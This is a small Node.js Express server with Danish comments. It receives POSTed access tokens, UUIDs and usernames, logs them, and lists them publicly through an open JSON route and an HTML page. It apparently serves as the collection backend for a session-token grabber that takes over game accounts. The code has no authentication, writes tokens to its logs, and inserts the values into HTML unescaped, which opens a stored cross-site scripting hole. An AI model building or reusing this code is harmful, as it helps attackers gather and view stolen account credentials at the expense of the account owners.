const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

const sessions = [];  // Her gemmer vi sessions midlertidigt i hukommelsen

app.post('/api/session', (req, res) => {
  const { accessToken, uuid, username } = req.body;
  console.log('Modtaget session:', { accessToken, uuid, username });
  sessions.push({ accessToken, uuid, username, receivedAt: new Date() });
  res.status(200).json({ message: 'Modtaget!' });
});

// Route til at hente alle sessions som JSON
app.get('/api/sessions', (req, res) => {
  res.json(sessions);
});

// Simple hjemmeside, der viser sessions i browseren
app.get('/', (req, res) => {
  let html = '<h1>Sessions modtaget</h1><ul>';
  sessions.forEach(session => {
    html += `<li>${session.username} (UUID: ${session.uuid}) - Token: ${session.accessToken} - Tid: ${session.receivedAt}</li>`;
  });
  html += '</ul>';
  res.send(html);
});

app.listen(PORT, () => {
  console.log(`Server kører på port ${PORT}`);
});
